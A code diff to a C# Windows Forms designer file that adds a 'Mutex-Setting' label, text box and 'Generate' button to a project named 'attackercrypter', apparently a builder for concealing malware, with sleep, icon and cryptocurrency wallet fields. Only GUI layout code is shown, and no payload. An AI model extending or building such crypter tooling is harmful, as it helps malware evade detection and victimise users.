@@ -100,6 +100,9 @@ namespace attackercrypter
             this.label14 = new System.Windows.Forms.Label();
             this.groupBox2 = new System.Windows.Forms.GroupBox();
             this.backgroundWorker3 = new System.ComponentModel.BackgroundWorker();
+            this.label15 = new System.Windows.Forms.Label();
+            this.mutex = new System.Windows.Forms.TextBox();
+            this.mutexgen = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSc)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSleep)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureIcon)).BeginInit();
@@ -911,6 +914,48 @@ namespace attackercrypter
             this.groupBox2.TabStop = false;
             this.groupBox2.Text = "groupBox2";
             // 
+            // label15
+            // 
+            this.label15.AutoSize = true;
+            this.label15.BackColor = System.Drawing.Color.Transparent;
+            this.label15.Font = new System.Drawing.Font("Arial", 10F, System.Drawing.FontStyle.Bold);
+            this.label15.ForeColor = System.Drawing.Color.White;
+            this.label15.Location = new System.Drawing.Point(156, 376);
+            this.label15.Name = "label15";
+            this.label15.Size = new System.Drawing.Size(107, 16);
+            this.label15.TabIndex = 89;
+            this.label15.Text = "Mutex-Setting";
+            this.label15.Click += new System.EventHandler(this.label15_Click);
+            // 
+            // mutex
+            // 
+            this.mutex.AccessibleDescription = "Your ETC Wallet Adress";
+            this.mutex.AccessibleName = "";
+            this.mutex.BackColor = System.Drawing.Color.White;
+            this.mutex.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.mutex.ForeColor = System.Drawing.Color.Black;
+            this.mutex.Location = new System.Drawing.Point(269, 381);
+            this.mutex.Multiline = true;
+            this.mutex.Name = "mutex";
+            this.mutex.Size = new System.Drawing.Size(272, 19);
+            this.mutex.TabIndex = 90;
+            this.mutex.Tag = "";
+            // 
+            // mutexgen
+            // 
+            this.mutexgen.BackColor = System.Drawing.Color.Red;
+            this.mutexgen.FlatAppearance.BorderSize = 0;
+            this.mutexgen.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.mutexgen.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.mutexgen.ForeColor = System.Drawing.Color.White;
+            this.mutexgen.Location = new System.Drawing.Point(551, 381);
+            this.mutexgen.Name = "mutexgen";
+            this.mutexgen.Size = new System.Drawing.Size(75, 19);
+            this.mutexgen.TabIndex = 91;
+            this.mutexgen.Text = "Generate";
+            this.mutexgen.UseVisualStyleBackColor = false;
+            this.mutexgen.Click += new System.EventHandler(this.mutexgen_Click);
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -918,6 +963,9 @@ namespace attackercrypter
             this.BackColor = System.Drawing.Color.White;
             this.BackgroundImage = global::attackercrypter.Properties.Resources.kali_linux_3;
             this.ClientSize = new System.Drawing.Size(1416, 559);
+            this.Controls.Add(this.mutexgen);
+            this.Controls.Add(this.mutex);
+            this.Controls.Add(this.label15);
             this.Controls.Add(this.groupBox2);
             this.Controls.Add(this.groupBox1);
             this.Controls.Add(this.panel1);
@@ -1070,6 +1118,9 @@ namespace attackercrypter
         private System.Windows.Forms.Label label14;
         private System.Windows.Forms.GroupBox groupBox2;
         private System.ComponentModel.BackgroundWorker backgroundWorker3;
+        private System.Windows.Forms.Label label15;
+        private System.Windows.Forms.TextBox mutex;
+        private System.Windows.Forms.Button mutexgen;
     }
 }
 
